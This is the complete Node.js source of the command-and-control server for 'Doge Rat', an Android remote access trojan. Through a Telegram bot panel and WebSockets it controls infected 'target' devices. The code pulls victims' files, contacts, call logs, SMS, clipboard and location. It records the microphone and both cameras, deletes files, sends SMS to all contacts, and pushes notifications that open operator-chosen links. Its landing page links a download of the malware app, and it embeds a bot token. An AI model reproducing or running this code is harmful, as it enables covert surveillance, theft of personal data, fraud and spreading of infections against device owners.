const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7357354055:AAH4W-B0qIRBRiNgts6KmeRRTUARauqwOMY'
const id = '6367172066'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">🐶 Doge Rat Application 🚀</h1> <br> <p style="font-size:16px; text-align:center; color:red;">Doge Rat App ➜ <a style="text-decoration: none;" href="https://github.com/Master-xyx/FreeApp/raw/refs/heads/main/DogeApps.zip">Download</a></p> <br><br> <p style="font-size:36px; text-align:center; color:red;">Subscribe 🔔 ➜ <a style="color:green; text-decoration: none;" href="https://youtube.com/@hackedtips">My YT Channel</a></p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `📱 Device Info <b>${req.headers.model}</b> connected`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `📱 Device Info <b>${req.headers.model}</b> connected\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `📍 Location from <b>${req.headers.model}</b> device`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `✅ New device connected\n\n` +
        `• Device Model : <b>${model}</b>\n` +
        `• Battery : <b>${battery}</b>\n` +
        `• Android Version : <b>${version}</b>\n` +
        `• Screen Brightness : <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `❌ Device disconnected\n\n` +
            `• Device Model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android Version : <b>${version}</b>\n` +
            `• Screen Brightness : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('📞 Enter the phone number you want to send message to')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '⚠️ Please enter the message you want to send to this number\n\n' +
                '• Be careful that the device will not sent if the number not correct in the country character in your device',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('⚠️ Please enter the message you want to send to this number')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📝 Enter the message you want to send to all contacts')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📁 Enter the path of the file you want to download')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🗑️ Enter the path of the file you want to delete')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🎤 Enter how many seconds you want to record microphone')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📹 Enter how many seconds you want to record main camera')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🤳 Enter how many seconds you want to record selfie camera')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('💬 Enter the message you want to show as toast on the target device')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🔔 Enter the message you want to show as notification')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '⚠️ Please enter the link you want to open when user click on the notification\n\n' +
                '• When the notification click the link you are entering will be opened in the target device',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('⚠️ Please enter the link you want to open when user click on the notification')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('🎵 Enter the audio link you want to play')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '✅ Command sent successfully\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '🚀 Welcome to Bot Panel\n\n' +
                '• If the application is installed on the target device, wait for the connection\n\n' +
                '• When you receive the connection, it means the target device is connected and ready to receive the commands\n\n' +
                '• Click on the device button below and select the desired device then select the command you want to execute\n\n' +
                '• If you get stuck somewhere in the bot, send /start command',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '📡 Connected Devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '❌ No connected devices found\n\n' +
                    '• Please make sure the application is installed on the target device'
                )
            } else {
                let text = '📱 List of connected devices :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Device Model : <b>${value.model}</b>\n` +
                        `• Battery : <b>${value.battery}</b>\n` +
                        `• Android Version : <b>${value.version}</b>\n` +
                        `• Screen Brightness : <b>${value.brightness}</b>\n` +
                        `• Provider : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '🔧 Device Control') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '❌ No connected devices found\n\n' +
                    '• Please make sure the application is installed on the target device'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '📱 Select device to control', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '🚫 Unauthorized connection')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`📱 Device control panel for device : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱 Apps', callback_data: `apps:${uuid}`},
                        {text: '📊 Device Info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂 Get File', callback_data: `file:${uuid}`},
                        {text: '🗑️ Delete File', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📋 Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: '🎤 Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📹 Main Camera', callback_data: `camera_main:${uuid}`},
                        {text: '🤳 Selfie Camera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍 Location', callback_data: `location:${uuid}`},
                        {text: '💬 Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📞 Calls', callback_data: `calls:${uuid}`},
                        {text: '📱 Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳 Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: '🔔 Show Notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '💬 Messages', callback_data: `messages:${uuid}`},
                        {text: '📤 Send Message', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🎵 Play Audio', callback_data: `play_audio:${uuid}`},
                        {text: '⏹️ Stop Audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '📨 Send Message To All Contacts',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '✅ Command sent successfully\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📡 Connected Devices"], ["🔧 Device Control"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '📞 Enter the phone number you want to send message to\n\n' +
            '•If you want to send message to local number, you can just enter the number without country code, otherwise enter the number with country code',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '📝 Enter the message you want to send to all contacts\n\n' +
            '• Be careful that the device will not sent if the number not correct in the country character in your device',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '📁 Enter the path of the file you want to download\n\n' +
            '• You do not need to enter the full path, just enter the main path. For example, enter <b>DCIM/Camera</b> to download gallery file.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🗑️ Enter the path of the file you want to delete\n\n' +
            '• You do not need to enter the full path, just enter the main path. For example, enter <b>DCIM/Camera</b> to delete gallery file.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🎤 Enter how many seconds you want to record microphone\n\n' +
            '• Note that you just enter the time number in seconds only',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '💬 Enter the message you want to show as toast on the target device\n\n' +
            '• Toast is a short message that appears on the device screen for a few seconds',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔔 Enter the message you want to show as notification\n\n' +
            '• Your device will appear in target device status bar like regular notification',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🎵 Enter the audio link you want to play\n\n' +
            '• Note that you just enter the direct link to the audio file, otherwise the audio will not be played',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);